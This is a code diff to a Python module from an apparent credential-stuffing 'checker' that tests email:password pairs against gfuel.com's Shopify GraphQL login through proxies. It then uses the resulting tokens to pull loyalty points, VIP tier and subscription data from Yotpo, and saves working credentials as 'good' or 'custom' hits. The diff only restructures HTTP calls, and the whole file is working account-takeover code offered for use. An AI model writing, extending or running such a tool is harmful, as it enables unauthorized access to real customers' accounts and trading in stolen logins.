@@ -1,6 +1,6 @@
 from __main__ import checker
 from modules.functions import set_proxy, log, save
-from requests import Session
+from requests import get,post
 from base64 import b64decode
 
 def check(email:str,password:str):
@@ -20,40 +20,39 @@ def check(email:str,password:str):
             "Content-Type":"application/graphql; charset=utf-8"
         }
         try:
-            with Session() as s:
-                r = s.post("https://gfuel.com/api/2021-07/graphql",data="mutation {customerAccessTokenCreate(input:{email:\""+email+"\",password:\""+password+"\"}){customerAccessToken{accessToken,expiresAt},userErrors{field,message}}}",headers=header,proxies=set_proxy(proxy),timeout=checker.timeout)
-                if "customerAccessToken\":null" in r.text:
-                    retries += 1
-                elif "accessToken" in r.text:
-                    token = r.json()["data"]["customerAccessTokenCreate"]["customerAccessToken"]["accessToken"]
+            r = post("https://gfuel.com/api/2021-07/graphql",data="mutation {customerAccessTokenCreate(input:{email:\""+email+"\",password:\""+password+"\"}){customerAccessToken{accessToken,expiresAt},userErrors{field,message}}}",headers=header,proxies=set_proxy(proxy),timeout=checker.timeout)
+            if "customerAccessToken\":null" in r.text:
+                retries += 1
+            elif "accessToken" in r.text:
+                token = r.json()["data"]["customerAccessTokenCreate"]["customerAccessToken"]["accessToken"]
 
-                    r = s.post("https://gfuel.com/api/2021-07/graphql",data="query {customer(customerAccessToken:\""+token+"\"){createdAt,displayName,email,id,firstName,lastName,phone}}",headers=header,proxies=set_proxy(proxy),timeout=checker.timeout).json()
-                    id = str(b64decode(r["data"]["customer"]["id"].encode()).decode()).split("gid://shopify/Customer/")[-1]
+                r = post("https://gfuel.com/api/2021-07/graphql",data="query {customer(customerAccessToken:\""+token+"\"){createdAt,displayName,email,id,firstName,lastName,phone}}",headers=header,proxies=set_proxy(proxy),timeout=checker.timeout).json()
+                id = str(b64decode(r["data"]["customer"]["id"].encode()).decode()).split("gid://shopify/Customer/")[-1]
 
-                    r = s.get(f"https://loyalty.yotpo.com/api/v1/customer_details?customer_email={email}&customer_external_id={id}&customer_token={token}&merchant_id=33869",proxies=set_proxy(proxy),timeout=checker.timeout)
-                    if r.status_code == 403:
-                        raise
-                    else:
-                        r = r.json()
-                        xp = r.get("points_balance")
-                        if xp == None or int(xp) <= 19:
-                            if not checker.cui:
-                                log("custom",email+":"+password,"Gfuel")
-                            save("Gfuel","custom",checker.time,email+":"+password+f" | XP: {xp}")
-                            checker.custom += 1
-                            checker.cpm += 1
-                            return
-                        else:
-                            tier = r.get("vip_tier").get("name")
-                            subscribed = r.get("subscribed")
-                            if not checker.cui:
-                                log("good",email+":"+password,"Gfuel")
-                            save("Gfuel","good",checker.time,email+":"+password+f" | Subscribed: {subscribed} | Tier: {tier} | XP: {xp}")
-                            checker.good += 1
-                            checker.cpm += 1
-                            return
-                else:
+                r = get(f"https://loyalty.yotpo.com/api/v1/customer_details?customer_email={email}&customer_external_id={id}&customer_token={token}&merchant_id=33869",proxies=set_proxy(proxy),timeout=checker.timeout)
+                if r.status_code == 403:
                     raise
+                else:
+                    r = r.json()
+                    xp = r.get("points_balance")
+                    if xp == None or int(xp) <= 19:
+                        if not checker.cui:
+                            log("custom",email+":"+password,"Gfuel")
+                        save("Gfuel","custom",checker.time,email+":"+password+f" | XP: {xp}")
+                        checker.custom += 1
+                        checker.cpm += 1
+                        return
+                    else:
+                        tier = r.get("vip_tier").get("name")
+                        subscribed = r.get("subscribed")
+                        if not checker.cui:
+                            log("good",email+":"+password,"Gfuel")
+                        save("Gfuel","good",checker.time,email+":"+password+f" | Subscribed: {subscribed} | Tier: {tier} | XP: {xp}")
+                        checker.good += 1
+                        checker.cpm += 1
+                        return
+            else:
+                raise
         except:
             checker.errors += 1
     if not checker.cui:
